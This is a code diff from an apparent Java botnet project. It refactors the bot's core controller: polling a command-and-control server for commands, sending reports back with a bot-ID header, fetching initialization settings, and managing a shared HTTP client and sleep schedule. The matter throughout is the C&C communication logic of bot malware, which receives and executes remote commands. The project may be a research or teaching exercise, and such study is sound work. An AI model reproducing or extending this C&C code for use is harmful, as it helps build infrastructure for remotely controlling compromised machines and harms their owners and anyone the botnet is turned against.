@@ -38,6 +38,7 @@ import com.acmutv.botnet.core.control.ControllerService;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.BotCommandService;
 import com.acmutv.botnet.core.control.command.CommandScope;
+import com.acmutv.botnet.core.control.command.serial.BotCommandJsonMapper;
 import com.acmutv.botnet.core.control.serial.ControllerPropertiesFormat;
 import com.acmutv.botnet.core.exception.*;
 import com.acmutv.botnet.core.exec.BotPool;
@@ -54,6 +55,16 @@ import com.acmutv.botnet.tool.net.ConnectionManager;
 import com.acmutv.botnet.tool.time.Duration;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonProcessingException;
+import org.apache.commons.io.IOUtils;
+import org.apache.http.HttpEntity;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.StringEntity;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
+import org.apache.http.protocol.HTTP;
+import org.apache.http.util.EntityUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.quartz.CronExpression;
@@ -61,9 +72,11 @@ import org.quartz.SchedulerException;
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.UnsupportedEncodingException;
 import java.net.SocketException;
 import java.net.URL;
 import java.net.UnknownHostException;
+import java.nio.charset.Charset;
 import java.text.ParseException;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -112,6 +125,11 @@ public class CoreController {
   private static long LAST_TIMESTAMP = 0;
 
   /**
+   * The HTTP client.
+   */
+  private static CloseableHttpClient HTTP_CLIENT;
+
+  /**
    * The list of shutdown hooks.
    */
   private static List<Runnable> SHUTDOWN_HOOKS = new ArrayList<Runnable>(){{
@@ -122,7 +140,7 @@ public class CoreController {
    * The bot entry-point.
    * @throws BotFatalException when bot's life cycle is interrupted.
    */
-  public static void startBot() throws BotFatalException {
+  public static void run() throws BotFatalException {
     changeState(BotState.INIT);
     boolean alive = true;
     while (alive) {
@@ -154,6 +172,7 @@ public class CoreController {
               LOGGER.info("Received outdated command. Skipping...");
               break;
             }
+            LAST_TIMESTAMP = cmd.getTimestamp();
             executeCommand(cmd);
             if (cmd.getScope().isWithReport() ||
                 (Boolean) cmd.getParams().getOrDefault("report", false)) {
@@ -273,24 +292,9 @@ public class CoreController {
     LOGGER.info("Contacting C&C at {}...", initResource);
 
     long failures = 0;
-
-    InputStream in = null;
-
     try {
-      if (HttpManager.isHttpUrl(initResource)) {
-        HttpMethod method = HttpMethod.GET;
-        URL url = new URL(initResource);
-        HttpProxy proxy = controller.getProxy();
-        Map<String,String> header = controller.getAuthentication(new HashMap<>());
-        header.put("bid", ID);
-        in = HttpManager.getResponseBody(method, url, proxy, header, null);
-      } else {
-        in = IOManager.getInputStream(initResource);
-      }
-      ControllerProperties controllerProps = ControllerService.from(ControllerPropertiesFormat.JSON, in);
-      if (controller.getAuthentication() == null) {
-        controller.setAuthentication(new HashMap<>());
-      }
+      ControllerProperties controllerProps = BotControllerInteractions.getInitialization(controller);
+      if (controller.getAuthentication() == null) controller.setAuthentication(new HashMap<>());
       controller.getAuthentication().putAll(controllerProps.getAuthentication());
     } catch (IOException exc) {
       failures++;
@@ -302,12 +306,7 @@ public class CoreController {
       } else {
         throw new ControllerConnectionException("Maximum number of reconnections reached for C&C at {}", initResource);
       }
-    } finally {
-      if (in != null) try {
-        in.close();
-      } catch (IOException ignored) { /* ignored */ }
     }
-
     CONTROLLER = controller;
   }
 
@@ -559,28 +558,14 @@ public class CoreController {
       }
     }
     LOGGER.trace("Report produced");
-    final String logResource = CONTROLLER.getLogResource();
-    LOGGER.info("Sending report to C&C at {}...", logResource);
-    final String json;
+    LOGGER.info("Sending report to C&C at {}...", CONTROLLER.getLogResource());
     try {
-      json = report.toJson();
-      if (HttpManager.isHttpUrl(logResource)) {
-        HttpProxy proxy = CONTROLLER.getProxy(AppConfigurationService.getConfigurations().getProxy());
-        Map<String,String> header = CONTROLLER.getAuthentication(new HashMap<>());
-        header.put("bid", ID);
-        Map<String,String> params = new HashMap<>();
-        params.put("report", json);
-        HttpManager.makeRequest(HttpMethod.POST, new URL(logResource), proxy, header, params);
-      } else if (IOManager.isWritableResource(logResource)) {
-        IOManager.writeResource(logResource, json);
-      }
+      BotControllerInteractions.submitReport(CONTROLLER, report, HTTP_CLIENT);
     } catch (JsonProcessingException exc) {
       throw new BotExecutionException("Cannot serialize report. %s", exc.getMessage());
     } catch (IOException exc) {
-      throw new BotExecutionException("Cannot communicate with C&C at %s", logResource);
+      throw new BotExecutionException("Cannot communicate with C&C at %s", CONTROLLER.getLogResource());
     }
-    LOGGER.info(AppLogMarkers.REPORT, "Report sent to C&C at {}\n{}",
-        CONTROLLER.getLogResource(), json);
   }
 
   /**
@@ -648,28 +633,34 @@ public class CoreController {
     LOGGER.info("Updating settings {}...", settings);
 
     for (String property : settings.keySet()) {
-      if (property.equals(ControllerProperties.PROPERTY_SLEEP)) {
-        final String sleep = settings.get(ControllerProperties.PROPERTY_SLEEP);
-        try {
-          if (sleep == null) {
-            POOL.removeSleepMode();
-          } else {
-            POOL.setSleepMode(new CronExpression(sleep));
+      switch (property) {
+
+        case ControllerProperties.PROPERTY_SLEEP:
+          final String sleep = settings.get(ControllerProperties.PROPERTY_SLEEP);
+          try {
+            if (sleep == null) {
+              POOL.removeSleepMode();
+            } else {
+              POOL.setSleepMode(new CronExpression(sleep));
+            }
+          } catch (ParseException | SchedulerException exc) {
+            throw new BotExecutionException("Cannot update [sleep]. %s", exc.getMessage());
           }
-        } catch (ParseException | SchedulerException exc) {
-          throw new BotExecutionException("Cannot update [sleep]. %s", exc.getMessage());
-        }
-        AppConfigurationService.getConfigurations().setSleep(sleep);
-      } else if (property.equals(ControllerProperties.USER_AGENT)){
-        if (CONTROLLER.getAuthentication() == null) {
-          CONTROLLER.setAuthentication(new HashMap<>());
-        }
-        CONTROLLER.getAuthentication().put("User-Agent", settings.get(property));
-      } else {
-        LOGGER.warn("Cannot update [{}], skipping. This version does not provide the update procedure.", property);
+          AppConfigurationService.getConfigurations().setSleep(sleep);
+          break;
+
+        case ControllerProperties.USER_AGENT:
+          if (CONTROLLER.getAuthentication() == null) {
+            CONTROLLER.setAuthentication(new HashMap<>());
+          }
+          CONTROLLER.getAuthentication().put("User-Agent", settings.get(property));
+          break;
+
+        default:
+          LOGGER.warn("Cannot update [{}], skipping. This version does not provide the update procedure.", property);
+          break;
       }
     }
-
     LOGGER.info("Settings updated");
   }
 
@@ -711,19 +702,7 @@ public class CoreController {
     LOGGER.trace("Consuming command from C&C at {}...", cmdResource);
     BotCommand cmd;
     try {
-      if (HttpManager.isHttpUrl(cmdResource)) {
-        HttpMethod method = HttpMethod.GET;
-        URL url = new URL(cmdResource);
-        HttpProxy proxy = CONTROLLER.getProxy();
-        Map<String,String> header = CONTROLLER.getAuthentication();
-        header.put("bid", ID);
-        try (InputStream in =
-                 HttpManager.getResponseBody(method, url, proxy, header, null)) {
-          cmd = BotCommandService.fromJson(in);
-        }
-      } else {
-        cmd = BotCommandService.consumeJsonResource(cmdResource);
-      }
+      cmd = BotControllerInteractions.getCommand(CONTROLLER, HTTP_CLIENT);
     } catch (IOException exc) {
       throw new BotCommandParsingException("Cannot consume command. %s", exc.getMessage());
     }
@@ -774,7 +753,12 @@ public class CoreController {
   private static void allocateResources() throws BotInitializationException {
     LOGGER.trace("Allocating resources...");
 
-    LOGGER.trace("Initializing scheduler..");
+    LOGGER.trace("Initializing HTTP client...");
+    HTTP_CLIENT = HttpClients.createDefault();
+    LOGGER.trace("Initializing HTTP client initialized...");
+
+
+    LOGGER.trace("Initializing scheduler...");
     try {
       POOL = new BotPool();
     } catch (SchedulerException exc) {
@@ -806,8 +790,11 @@ public class CoreController {
     LOGGER.trace("Freeing resources {} waiting for jobs to complete...", wait ? "" : "not");
     try {
       POOL.destroy(wait);
+      HTTP_CLIENT.close();
     } catch (SchedulerException exc) {
-      throw new BotExecutionException("Cannot free resources. %s", exc.getMessage());
+      throw new BotExecutionException("Cannot free scheduler resources. %s", exc.getMessage());
+    } catch (IOException exc) {
+      throw new BotExecutionException("Cannot free HTTP client resources. %s", exc.getMessage());
     }
     LOGGER.trace("Resources freed");
   }
